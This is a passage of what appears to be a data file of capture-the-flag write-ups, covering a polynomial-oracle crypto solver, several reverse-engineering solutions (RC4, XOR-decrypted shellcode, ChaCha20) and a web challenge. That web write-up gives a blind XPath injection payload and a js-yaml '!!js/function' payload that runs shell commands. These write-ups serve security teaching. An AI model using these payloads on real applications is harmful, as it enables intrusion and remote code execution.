<code>candidates</code> list, initially containing all 256 indices.</li>\n<li>  In each trial, we split the <code>candidates</code> list into two halves: <code>test_group</code> and <code>rest_group</code>.</li>\n<li>  We then constructed a polynomial that assigned 4 items to all slots in the <code>test_group</code> (and padded this group with \"safe\" indices from previous trials to ensure exactly 128 \"size-4\" slots). The remaining slots were assigned 3 items.</li>\n<li>  If the server reported \"failed,\" the <code>target</code> was in our <code>test_group</code>.</li>\n<li>  If the server reported \"passed,\" the <code>target</code> was in our <code>rest_group</code>.</li>\n<li>  This effectively halved the <code>candidates</code> list in each trial: $256 \\to 128 \\to 64 \\to 32 \\to 16 \\to 8 \\to 4$.</li>\n</ul>\n4.  Final Guess: After 6 trials, we were left with 4 candidate indices. Since we had no further information, we simply guessed the first index in the remaining <code>candidates</code> list. This gave us a 1/4 (25%) chance of success for each connection attempt.\n5.  Automation and Retries: The entire process was wrapped in a <code>while True</code> loop to automatically reconnect and retry the challenge until the correct index was guessed and the flag was obtained.</p>\n<p>Execution:\nThe Python script <code>solve.py</code> was executed. It connected to the remote instance, performed the polynomial calculations and interactions for Phase 1 and 2, and eventually succeeded in guessing the correct index.</p>\n<pre><code class=\"python\">from pwn import *\nimport sys\nimport time\nimport traceback\n<p>&lt;h2&gt;Set context&lt;/h2&gt;\ncontext.log_level = 'info'</p>\n<p>MOD = 10**9 + 7\nN = 896\nK = 256</p>\n<p>def solve_poly(inputs, targets):\n    n = len(inputs)\n    # 1. Compute M(x) = product(x - inputs[i])\n    M = [1] \n    for x in inputs:\n        c = (MOD - x) % MOD\n        new_M = [0] * (len(M) + 1)\n        for i in range(len(M)):\n            new_M[i] = (new_M[i] + M[i] * c) % MOD\n            new_M[i+1] = (new_M[i+1] + M[i]) % MOD\n        M = new_M</p>\n<p>M_deriv = []\n    for i in range(1, len(M)):\n        M_deriv.append((M[i] * i) % MOD)</p>\n<p>w = []\n    for x in inputs:\n        val = 0\n        power_x = 1\n        for c in M_deriv:\n            val = (val + c * power_x) % MOD\n            power_x = (power_x * x) % MOD\n        w.append(val)</p>\n<p>inv_w = [pow(val, MOD-2, MOD) for val in w]</p>\n<p>final_poly = [0] * n</p>\n<p>for j in range(n):\n        target = targets[j]\n        if target == 0: continue # Optimization</p>\n<p>scale = (target * inv_w[j]) % MOD\n        if scale == 0: continue</p>\n<p>c = inputs[j]\n        carry = 0 \n        for k in range(n, 0, -1):\n             val = (M[k] + c * carry) % MOD\n             carry = val\n             final_poly[k-1] = (final_poly[k-1] + val * scale) % MOD</p>\n<p>return final_poly</p>\n<p>def main():\n    while True:\n        try:\n            # Connect\n            log.info(\"Connecting...\")\n            r = remote('remote.infoseciitr.in', 4006)</p>\n<p># Read intro\n            r.recvuntil(b\"Press Enter to start &gt; \")\n            r.sendline(b\"\")</p>\n<p># Read leaked numbers\n            r.recvuntil(b\"Here are the leaked numbers : \")\n            nums_str = r.recvline().strip().decode()\n            number_array = list(map(int, nums_str.split(',')))</p>\n<p>log.info(f\"Received {len(number_array)} numbers\")</p>\n<p># Phase 1: Provide balanced hash\n            targets = []\n            slot_counts = [0] * K\n            for i in range(N):\n                if i &lt; 512:\n                    slot = i // 4\n                else:\n                    rem = i - 512\n                    slot = 128 + (rem // 3)\n                targets.append(slot)\n                slot_counts[slot] += 1</p>\n<p>log.info(\"Computing Phase 1 polynomial...\")\n            coeffs = solve_poly(number_array, targets)\n            payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>ret = r.recvuntil(b\"Press Enter to continue &gt; \", timeout=10)\n            if b\"Press Enter\" not in ret:\n                log.error(\"Phase 1 failed or timed out\")\n                log.error(ret.decode())\n                r.close()\n                continue</p>\n<p>log.info(\"Phase 1 success.\")\n            r.sendline(b\"\")</p>\n<p># Phase 2: Find the index\n            candidates = list(range(K))\n            safe_indices = []</p>\n<p>for trial in range(6):\n                log.info(f\"Trial {trial+1}, Candidates: {len(candidates)}\")</p>\n<p>mid = len(candidates) // 2\n                test_group = candidates[:mid]\n                rest_group = candidates[mid:]</p>\n<p>needed = 128 - len(test_group)\n                if needed &lt; 0: needed = 0\n                padding = safe_indices[:needed]</p>\n<p>slots_for_4 = set(test_group + padding)\n                # Ensure we have exactly 128\n                if len(slots_for_4) != 128:\n                    log.warning(f\"Slots for 4 count: {len(slots_for_4)}. Candidates: {len(candidates)}\")</p>\n<p>current_slot_counts = {}\n                for s in range(K):\n                    if s in slots_for_4:\n                        current_slot_counts[s] = 4\n                    else:\n                        current_slot_counts[s] = 3</p>\n<p>target_slots_list = []\n                for s in range(K):\n                    count = current_slot_counts[s]\n                    for _ in range(count):\n                        target_slots_list.append(s)</p>\n<p>log.info(\"Computing Phase 2 polynomial...\")\n                coeffs = solve_poly(number_array, target_slots_list)\n                payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>response = r.recvuntil(b\"\\n\\n\").decode()</p>\n<p>if \"passed\" in response:\n                    candidates = rest_group\n                    safe_indices.extend(test_group)\n                else:\n                    candidates = test_group\n                    safe_indices.extend(rest_group)</p>\n<p>log.info(f\"Candidates left: {candidates}\")\n            guess = candidates[0]\n            log.info(f\"Guessing: {guess}\")</p>\n<p>r.sendlineafter(b\"Tell your friend the index : \", str(guess).encode())</p>\n<p>final_res = r.recvall(timeout=5).decode()\n            print(final_res)</p>\n<p>if \"flag\" in final_res.lower() or \"Flag\" in final_res or \"{\" in final_res:\n                print(\"FOUND FLAG!\")\n                break\n            else:\n                log.info(\"Failed, retrying...\")\n                r.close()</p>\n<p>except BaseException as e:\n            print(f\"CRITICAL ERROR: {e}\")\n            traceback.print_exc()\n            try: r.close()\n            except: pass\n            time.sleep(1)</p>\n<p>if __name__ == \"__main__\":\n    main()\n</code></pre></p>\n<p>Flag: <code>flag{h0w_d1d_h3_b3c0m3_th3_m4n4g3r}</code></p>\n"
            },
            {
                "id": "to_jmp_or_not_jmp",
                "title": "To_jmp_or_not_jmp",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "assembly",
                    "disassembler",
                    "memory"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>The challenge presented a stripped 64-bit ELF executable named <code>challenge</code>. When executed, it prompted for a \"flag\" and responded with \"Wrong! Try again.\" if an incorrect input was provided. The goal was to find the correct flag.</p>\n<h3>2. Initial Analysis</h3>\n<ul>\n<li>  <strong>File Type:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ls -la &amp;&amp; file challenge\n    </code></pre>\n    Output confirmed it was an <code>ELF 64-bit LSB pie executable, x86-64, stripped</code>. The \"stripped\" nature meant function names were removed, increasing the difficulty of static analysis. \"PIE\" (Position-Independent Executable) indicated that addresses would be relative, requiring careful RIP-relative address calculations.\n<ul>\n<li>  <strong>Execution:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ./challenge\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag: 12345\n    Wrong! Try again.\n    </code></pre>\n    This confirmed the program's basic interaction.\n<ul>\n<li>  <strong>Strings Analysis:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    strings challenge | grep -i flag\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag:\n    Correct! You got the flag!\n    </code></pre>\n    The presence of \"Correct! You got the flag!\" suggested a comparison logic within the binary that we needed to locate and understand.\n<h3>3. Reverse Engineering - Control Flow Obfuscation</h3>\n<p>The primary challenge in static analysis was the presence of control flow obfuscation using a pattern of <code>je</code> (jump if equal) and <code>jne</code> (jump if not equal) instructions targeting the same address. This effectively created an unconditional jump but confused disassemblers and made linear analysis difficult. For example:</p>\n<pre><code class=\"assembly\">    16a9:       74 03                   je     16ae\n    16ab:       75 01                   jne    16ae\n</code></pre>\nBoth instructions would jump to <code>16ae</code>, making <code>16ae</code> the actual next instruction. This pattern required careful manual tracing of the control flow.\n<p>The binary also used dynamic jump targets:\n1.  An address (e.g., <code>0x11c9</code>) was calculated using <code>lea rax, [rip + offset]</code>.\n2.  This address was then stored in a global memory location (e.g., <code>mov QWORD PTR [rip+offset], rax</code>).\n3.  Later, the value from that global memory location was loaded into a register (<code>mov rax, QWORD PTR [rip+offset]</code>).\n4.  Finally, an indirect jump (<code>jmp rax</code>) was used to transfer execution to the calculated address. This made it difficult to follow the flow directly in <code>objdump</code> without careful calculation.</p>\n<p>After tracing the obfuscated entry point (<code>0x10e0</code>) and subsequent jumps, the effective <code>main</code> function started at <code>0x11c9</code>.</p>\n<h3>4. Identifying RC4 Algorithm</h3>\n<p>Inside the <code>main</code> function (starting at <code>0x11c9</code> after initial setup), the following sequence of operations was identified:</p>\n<ul>\n<li>  <strong>Prompt for Input:</strong> The string \"Enter the flag:\" was printed, followed by a call to <code>std::getline</code> to read user input. The length of the input was stored in a global variable at <code>0x44a0</code>.</li>\n<li>  <strong>S-box Initialization (KSA Phase 1):</strong> A loop from <code>0</code> to <code>255</code> initialized a 256-byte array (likely the S-box for RC4) with <code>S[i] = i</code>. This array was located in the <code>.bss</code> section (uninitialized data), eventually mapped to virtual address <code>0x4280</code>.</li>\n<li>  <strong>Key Scheduling Algorithm (KSA Phase 2):</strong> A second loop (from <code>i=0</code> to <code>255</code>) performed the key-dependent scrambling of the S-box. The logic closely matched the standard RC4 KSA:</li>\n</ul>\n    <pre><code class=\"\">    j = (j + S[i] + key_byte) % 256\n    swap(S[i], S[j])\n    </code></pre>\n<ul>\n<li>  <strong>Pseudo-Random Generation Algorithm (PRGA):</strong> After the KSA, a third loop iterated for the length of the user's input. In each iteration, it generated a keystream byte and XORed it with a byte of the user's input. The standard RC4 PRGA was identified:</li>\n</ul>\n    <pre><code class=\"\">    i = (i + 1) % 256\n    j = (j + S[i]) % 256\n    swap(S[i], S[j])\n    K = S[(S[i] + S[j]) % 256]\n    encrypted_input_byte = input_byte ^ K\n    </code></pre>\n    The results of this XOR operation (the \"encrypted\" user input) were stored in a buffer at <code>0x4420</code>.\n<ul>\n<li>  <strong>Comparison:</strong> Finally, the \"encrypted\" user input (from <code>0x4420</code>) was compared byte-by-byte with a pre-stored ciphertext.</li>\n<li>  If all bytes matched, the program jumped to a block that printed \"Correct! You got the flag!\" (identified by tracing a <code>lea</code> instruction to <code>0x20a1</code> in <code>.rodata</code>).</li>\n<li>  If any byte mismatched, it jumped to a block that printed \"Wrong! Try again.\"</li>\n</ul>\nThis confirmed that the challenge involved an RC4-encrypted flag, and we needed to reverse the encryption by finding the key and the pre-stored ciphertext.\n<h3>5. Extracting RC4 Parameters</h3>\n<h4>a. Key Identification</h4>\n<ul>\n<li>  During KSA analysis, an instruction <code>lea rdx,[rip+0xccd]</code> was found, which resolved to address <code>0x2020</code>. This address was within the <code>.rodata</code> section, indicating it was a constant string.</li>\n<li>  A modulo operation <code>(i % 15)</code> was used to index into this data, suggesting a key length of 15.</li>\n<li>  Dumping 15 bytes from <code>0x2020</code> in the <code>challenge</code> binary:</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2020)) count=15 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  21 61 31 20 61 26 0d 39  61 2b 0d 20 31 66 73     |!a1 a&amp;.9a+. 1fs|\n    </code></pre>\n    The key bytes were <code>21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73</code>. Note that <code>0d</code> is Carriage Return (<code>\\r</code>), not a period (<code>.</code>). The string representation is <code>!a1 a&\\r9a+\\r 1fs</code>.\n<h4>b. Key Modification</h4>\n<ul>\n<li>  A critical instruction <code>xor eax, 0x52</code> was discovered immediately after fetching a key byte <code>key[i % key_len]</code> and before it was added to <code>j</code> in the KSA. This meant each key byte was XORed with <code>0x52</code> during the KSA process.</li>\n</ul>\n<h4>c. Ciphertext Identification</h4>\n<ul>\n<li>  The comparison loop read from a location at <code>0x2040</code>. This address was also within <code>.rodata</code>, indicating it was the static ciphertext of the flag.</li>\n<li>  Dumping bytes from <code>0x2040</code> (initially 64 bytes, then extended to 66 when the flag revealed its full length):</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2040)) count=66 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  8f 36 cf 7d 04 8e 35 ac  0f e8 3f 53 8b 87 ac 26  |.6.}..5...?S...&amp;|\n    00000010  18 5b 13 c7 ff a6 1d 92  29 b7 62 af a9 b0 cf 74  |.[......).b....t|\n    00000020  d2 99 4e 55 47 a9 77 3b  67 28 cb 52 74 90 47 24  |..NUG.w;g(.Rt.G$|\n    00000030  15 94 e1 4e 4d f2 57 ad  7f 5d 22 17 05 08 8b 2a  |...NM.W..\"....*|\n    00000040  ed f1                                            |..              |\n    </code></pre>\n    The ciphertext bytes are <code>8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1</code>.\n<h3>6. Decryption</h3>\n<p>A Python script <code>solve.py</code> was written to implement the RC4 algorithm with the identified key and ciphertext, including the key modification step.</p>\n<pre><code class=\"python\">def rc4_ksa(key_bytes):\n    S = list(range(256))\n    j = 0\n    key_len = len(key_bytes)\n    for i in range(256):\n        # Apply the modification found in analysis: XOR key byte with 0x52\n        modified_key_byte = key_bytes[i % key_len] ^ 0x52\n        j = (j + S[i] + modified_key_byte) % 256\n        S[i], S[j] = S[j], S[i]\n    return S\n<p>def rc4_prga(S, data_len):\n    i = 0\n    j = 0\n    keystream = []\n    # Create a copy of S for PRGA so KSA S-box is not modified\n    S_prga = list(S) \n    for _ in range(data_len):\n        i = (i + 1) % 256\n        j = (j + S_prga[i]) % 256\n        S_prga[i], S_prga[j] = S_prga[j], S_prga[i]\n        K = S_prga[(S_prga[i] + S_prga[j]) % 256]\n        keystream.append(K)\n    return keystream</p>\n<p>&lt;h2&gt;Key bytes derived from hexdump, including 0x0d for Carriage Return&lt;/h2&gt;\nkey_hex_str = \"21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73\"\nkey_bytes = [int(b, 16) for b in key_hex_str.split()]</p>\n<p>&lt;h2&gt;Ciphertext bytes from 0x2040&lt;/h2&gt;\nciphertext_hex = \"8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1\"\nciphertext = bytes.fromhex(ciphertext_hex.replace(\" \", \"\"))</p>\n<p>S_ksa = rc4_ksa(key_bytes)\nkeystream = rc4_prga(S_ksa, len(ciphertext))</p>\n<p>decrypted_bytes = []\nfor c, k in zip(ciphertext, keystream):\n    decrypted_bytes.append(c ^ k)</p>\n<p>print(\"Decrypted bytes:\", decrypted_bytes)\nprint(\"Decrypted string:\", bytes(decrypted_bytes))\n</code></pre></p>\n<p>Running <code>python3 solve.py</code> produced:</p>\n<pre><code class=\"\">Decrypted string: b'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}'\n</code></pre>\n<h3>7. Verification</h3>\n<p>To verify the decrypted flag, the executable needed to be run with execute permissions. After restoring execute permissions:</p>\n<pre><code class=\"bash\">chmod +x challenge\necho 'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}' | ./challenge\n</code></pre>\n<p>Output:\n<pre><code class=\"\">Enter the flag: Correct! You got the flag!\n</code></pre></p>\n<p>This confirmed the flag was correctly identified.</p>\n<h3>Flag</h3>\n<p><code>flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}</code></p>\n<p>```</p>\n"
            },
            {
                "id": "trust-issues",
                "title": "Trust Issues",
                "category": "Web Exploitation",
                "tags": [
                    "injection"
                ],
                "writeup": "<p>1.  <strong>Blind XPath Injection (Timing Attack):</strong>\n    The <code>login</code> endpoint was vulnerable to XPath injection via the <code>username</code> field. The application performed a <code>setTimeout(..., 2000)</code> if a user was found, creating a timing oracle. By injecting XPath queries, we could ask true/false questions about the database content based on the response time.\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        const query = <code>//user[username/text()='${username}']</code>;\n        const userNode = xpath.select(query, xmlDoc)[0];\n        if (userNode) { await new Promise(resolve =&gt; setTimeout(resolve, 2000)); }\n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We used a script to iterate through characters of the admin's password using the payload <code>admin' and substring(password, N, 1)='C</code>. This allowed us to extract the admin password: <code>df08cf</code>.</li>\n</ul>\n2.  <strong>Remote Code Execution (RCE) via YAML Deserialization:</strong>\n    With the admin credentials, we accessed the <code>/admin/create</code> endpoint. This endpoint accepted YAML content and parsed it using an outdated and vulnerable version of <code>js-yaml</code> (v2.0.4).\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        parsed = yaml.load(fileContent);\n        const applied = '' + parsed; \n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We constructed a malicious YAML payload using the <code>!!js/function</code> tag, which allows execution of arbitrary JavaScript code during parsing in this version of <code>js-yaml</code>. We used an IIFE (Immediately Invoked Function Expression) to run system commands. Since <code>require</code> is not available in the global scope of <code>new Function</code>, we accessed it via <code>process.mainModule.require</code>.</li>\n</ul>\n    <strong>Payload:</strong>\n    <pre><code class=\"yaml\">    !!js/function \"function() { var req = process.mainModule.require; var res = req('child_process').execSync('cat flag.txt').toString(); return res; }()\"\n    </code></pre></p>\n<p><strong>Flag:</strong>\n<code>flag{xPath_to_YamLrc3_ecddd907d5d5decb}</code></p>\n"
            },
            {
                "id": "vault",
                "title": "Vault",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p>The challenge presented a stripped 64-bit ELF executable named <code>chal</code>.\nUpon execution, it prompted for a password:</p>\n<pre><code class=\"\">I heard that you got some crazy vault breaking skills\n<p>Try to break this one</p>\n<p>Enter the password:\n</code></pre></p>\n<p>Initial attempts with arbitrary input resulted in:</p>\n<pre><code class=\"\">L00ks like you got some real skill issue.\nBetter luck next time.\n</code></pre>\n<p>Analysis using <code>objdump -d chal</code> and <code>readelf -S chal</code> revealed the following:</p>\n<p>1.  <strong>Password Length:</strong> The <code>main</code> function (at <code>0x1460</code>) used <code>scanf</code> to read input and then checked its length using <code>strcspn</code>. It compared the length against <code>0x35</code> (decimal 53). If the length was not 53, it printed the \"skill issue\" message and exited. This established the password length as 53 characters.</p>\n<p>2.  <strong>Dynamic Code Generation (JIT):</strong>\n    The core validation logic was found in a function called by <code>main</code> (at <code>0x1379</code>). This function iterated 53 times (once for each character of the password). In each iteration, it performed the following:\n<ul>\n<li>  It called another function (at <code>0x1249</code>) to dynamically generate a small piece of executable code (shellcode).</li>\n<li>  This dynamically generated shellcode was then executed to validate the current character of the password.</li>\n<li>  The address of the generated shellcode (in a memory-mapped executable region) was passed via <code>%r9</code>.</li>\n</ul>\n3.  <strong>Shellcode Generation Logic (Function at <code>0x1249</code>):</strong>\n    This function was responsible for \"decrypting\" the validation logic for each password character.\n<ul>\n<li>  It allocated a 56-byte executable memory region using <code>mmap</code>.</li>\n<li>  It iterated 56 times, reading an encrypted byte <code>B</code> from a <code>data</code> section (<code>0x4020 + 57 * i + j</code>).</li>\n<li>  It XORed <code>B</code> with a 4-byte key <code>K</code> (read from <code>0x4c00 + i * 4</code>). Specifically, it used the lowest byte of the XOR operation <code>(B ^ K) & 0xFF</code> to reconstruct the shellcode byte. This means <code>K</code> was effectively used as a single-byte XOR key for decryption, repeating for each byte of the shellcode.</li>\n<li>  The decrypted bytes formed the actual machine code for the character's validation function.</li>\n</ul>\n4.  <strong>Shellcode Validation Logic:</strong>\n    Disassembly of the generated shellcode (e.g., <code>func_0.bin</code>) revealed a consistent structure:\n<ul>\n<li>  <code>mov $SHIFT, %ecx</code>: The first instruction loaded a varying <code>SHIFT</code> value into <code>%ecx</code>. This <code>SHIFT</code> determined the starting bit position for validation.</li>\n<li>  <code>xor %rsi, %rdi</code>: The input character (<code>%rdi</code>) was XORed with the full 4-byte key (<code>%rsi</code>, passed from the main loop, which was <code>K</code>). Let <code>Y = input_char ^ K</code>.</li>\n<li>  A loop then iterated 8 times (for bits 0-7). In each iteration <code>k</code> (0 to 7):</li>\n<li>  It extracted a specific bit from <code>Y</code>: <code>bit = (Y >> ((SHIFT + k) % 8)) & 1</code>.</li>\n<li>  This <code>bit</code> was compared against an <code>expected_bit</code> value. The <code>expected_bit</code> was read from a <code>bits</code> section (<code>0x4ce0 + i * 32 + k * 4</code>).</li>\n<li>  If all 8 bits matched, the shellcode returned 1 (success); otherwise, it returned 0 (failure).</li>\n</ul>\n5.  <strong>Reconstruction Algorithm:</strong>\n    To find the password, for each character <code>i</code> from 0 to 52:\n<ul>\n<li>  <strong>Get Key:</strong> Read the 4-byte key <code>K</code> from <code>0x4c00 + i * 4</code>.</li>\n<li>  <strong>Get Shift:</strong> Decrypt the first two bytes of the <code>i</code>-th shellcode. The second byte <code>b1</code> of the decrypted code (<code>data[0x3020 + 57*i + 1] ^ (K & 0xFF)</code>) yielded the <code>SHIFT</code> value.</li>\n<li>  <strong>Reconstruct Y:</strong> Initialize <code>Y = 0</code>. For <code>k</code> from 0 to 7:</li>\n<li>  Read <code>expected_bit</code> from <code>0x4ce0 + i * 32 + k * 4</code>.</li>\n<li>  Calculate the bit position: <code>bit_pos = (SHIFT + k) % 8</code>.</li>\n<li>  If <code>expected_bit</code> is 1, set the <code>bit_pos</code> bit in <code>Y</code>.</li>\n<li>  <strong>Derive Character:</strong> Since <code>Y = input_char ^ K</code>, then <code>input_char = Y ^ K</code>. As only the lower 8 bits were relevant (<code>Y</code> was an 8-bit value), the actual character was <code>chr(Y ^ (K & 0xFF))</code>.</li>\n</ul>\nThe Python script <code>solve_final_v2.py</code> implemented this logic.</p>\n<p><strong>Python Script (<code>solve_final_v2.py</code>):</strong></p>\n<pre><code class=\"python\">import struct\n<p>def solve():\n    with open('chal', 'rb') as f:\n        data = f.read()</p>\n<p># Offsets (determined from readelf -S chal)\n    # 0x4020 (data_section_offset) is relative to its containing .data section (0x3000 file offset)\n    # 0x4c00 (key_section_address) -&gt; 0x3c00 (file offset)\n    # 0x4ce0 (bits_section_address) -&gt; 0x3ce0 (file offset)\n    data_section_offset = 0x3020\n    key_section_offset = 0x3c00\n    bits_section_offset = 0x3ce0</p>\n<p>password = []</p>\n<p>for i in range(53):\n        # 1. Read Key (used as XOR key in the check function)\n        key_offset = key_section_offset + (i * 4)\n        key_bytes = data[key_offset:key_offset+4]\n        key = struct.unpack('&lt;I', key_bytes)[0] # Keys are 4-byte little endian integers</p>\n<p># 2. Decrypt the first two bytes of the shellcode to find 'start_shift'\n        # The instruction is 'b9 SHIFT 00 00 00' (mov $SHIFT, %ecx)\n        # Encrypted byte 0: data[data_section_offset + 57*i + 0]\n        # Encrypted byte 1: data[data_section_offset + 57*i + 1]</p>\n<p>enc_b0 = data[data_section_offset + 57*i + 0]\n        enc_b1 = data[data_section_offset + 57*i + 1]</p>\n<p>dec_b0 = enc_b0 ^ (key &amp; 0xFF) # The lowest byte of the key is used for shellcode decryption\n        dec_b1 = enc_b1 ^ (key &amp; 0xFF)</p>\n<p>if dec_b0 != 0xB9:\n            print(f\"Error: Func {i} does not start with 0xB9 (mov %ecx). Found {hex(dec_b0)}\")\n            # Fallback to default if there's an unexpected format, though this indicates an issue.\n            start_shift = 4 \n        else:\n            start_shift = dec_b1</p>\n<p># 3. Reconstruct Y = char ^ K (where K is the actual 4-byte key)\n        # The character's bits are checked in the order: (start_shift + k) % 8 for k = 0 to 7.</p>\n<p>Y = 0 # This will hold the 8-bit value of (char ^ K)\n        base_bits_offset = bits_section_offset + (i * 32)</p>\n<p>for k in range(8):\n            # The expected bit is stored as a single byte at base_bits_offset + (k * 4)\n            expected_bit_offset = base_bits_offset + (k * 4)\n            expected_bit = data[expected_bit_offset] # Read byte</p>\n<p># The bit position in Y being checked in this iteration\n            bit_pos = (start_shift + k) % 8</p>\n<p>if expected_bit: # If the expected bit is 1\n                Y |= (1 &lt;&lt; bit_pos) # Set that bit in Y</p>\n<p># 4. Derive the actual character\n        # We have Y = input_char ^ K. Therefore, input_char = Y ^ K.\n        # Since Y is an 8-bit value, we only care about the lowest 8 bits of K.\n        char_code = Y ^ (key &amp; 0xFF)\n        password.append(chr(char_code))</p>\n<p>print(\"Password:\", \"\".join(password))</p>\n<p>if __name__ == '__main__':\n    solve()\n</code></pre></p>\n<p><strong>Execution:</strong>\nRunning the script yielded the password:\n<code>flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}</code></p>\n<p>Verification with <code>./chal</code> confirmed the flag:\n<code>echo \"flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}\" | ./chal</code>\nOutput: <code>Good job</code></p>\n"
            },
            {
                "id": "where-code",
                "title": "Where code",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<p>1. Initial Analysis</p>\n<p>We started with a 64-bit ELF binary named challenge. Running strings on the binary revealed a critical clue:\nPlaintext</p>\n<p>expand 32-byte k</p>\n<p>This string is the distinct sigma constant used in ChaCha20 and Salsa20 stream ciphers. This immediately suggests that the flag is being encrypted or decrypted using one of these algorithms.\n2. Static Analysis (Decompilation)</p>\n<p>Opening the binary in a decompiler (like Ghidra) revealed a main function calling a subroutine FUN_00101592. Analyzing this subroutine confirmed the encryption logic.\nThe Encryption Routine</p>\n<p>The function initializes a state matrix using the constants found earlier:</p>\n<p>0x61707865 (\"apxe\")</p>\n<p>0x3320646e (\"3 dn\")</p>\n<p>0x79622d32 (\"yb-2\")</p>\n<p>0x6b206574 (\"k et\")</p>\n<p>Reversed (Little Endian), this spells \"expand 32-byte k\". The code then performs an XOR operation on the input buffer, confirming it is a stream cipher.\nIdentifying the Secrets</p>\n<p>To decrypt the flag, we needed three components: the Key, the Nonce (IV), and the Ciphertext. By analyzing the memory addresses in the decompiled code, we mapped the virtual addresses to file offsets:</p>\n<p>The Key (32 bytes):</p>\n<p>Location: 0x2080</p>\n<p>Value: A sequential pattern 00 01 02 ... 1F.</p>\n<p>The Nonce (12 bytes):</p>\n<p>Location: 0x20A0</p>\n<p>Value: Mostly nulls with 4A in the middle (000000000000004a00000000).</p>\n<p>The Ciphertext:</p>\n<p>Location: 0x2040</p>\n<p>Analysis: The main function passed a pointer to this address as the first argument to the encryption function. It contained roughly 34 bytes of raw binary data.</p>\n<p>3. The Problem</p>\n<p>Attempting to debug with GDB was inconsistent. Additionally, standard Python libraries (PyCryptodome) sometimes handle the ChaCha20 block counter differently (starting at 0 vs 1). The binary explicitly initialized the block counter to 1.\n4. The Solution</p>\n<p>We wrote a Python script to manually implement the ChaCha20 block function. This allowed us to:</p>\n<p>Extract the Key, Nonce, and Ciphertext directly from the binary file using the offsets found in Step 2.</p>\n<p>Force the block counter to start at 1 to match the binary's behavior.</p>\n<p>XOR the generated keystream with the ciphertext.</p>\n<p>Solver Script\n``<code>python \nimport struct</p>\n<p>def rotl32(x, n):\n    return ((x << n) & 0xffffffff) | (x >> (32 - n))</p>\n<p>def chacha20_block(key, counter, nonce):\n    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]\n    k = list(struct.unpack('<8I', key))\n    n = list(struct.unpack('<3I', nonce))\n    state = constants + k + [counter] + n\n    working_state = list(state)</p>\n<p># 20 rounds (Standard ChaCha20)\n    for _ in range(10): \n        def qr(a, b, c, d):\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 16)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 12)\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 8)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 7)\n            return a, b, c, d</p>\n<p># Column & Diagonal rounds\n        working_state[0], working_state[4], working_state[8], working_state[12] = qr(working_state[0], working_state[4], working_state[8], working_state[12])\n        working_state[1], working_state[5], working_state[9], working_state[13] = qr(working_state[1], working_state[5], working_state[9], working_state[13])\n        working_state[2], working_state[6], working_state[10], working_state[14] = qr(working_state[2], working_state[6], working_state[10], working_state[14])\n        working_state[3], working_state[7], working_state[11], working_state[15] = qr(working_state[3], working_state[7], working_state[11], working_state[15])\n        working_state[0], working_state[5], working_state[10], working_state[15] = qr(working_state[0], working_state[5], working_state[10], working_state[15])\n        working_state[1], working_state[6], working_state[11], working_state[12] = qr(working_state[1], working_state[6], working_state[11], working_state[12])\n        working_state[2], working_state[7], working_state[8], working_state[13] = qr(working_state[2], working_state[7], working_state[8], working_state[13])\n        working_state[3], working_state[4], working_state[9], working_state[14] = qr(working_state[3], working_state[4], working_state[9], working_state[14])</p>\n<p>return b''.join(struct.pack('<I', (working_state[i] + state[i]) & 0xffffffff) for i in range(16))</p>\n<p>with open(\"challenge\", \"rb\") as f:\n    data = f.read()\n    key = data[0x2080:0x20a0]\n    nonce = data[0x20a0:0x20ac]\n    cipher = 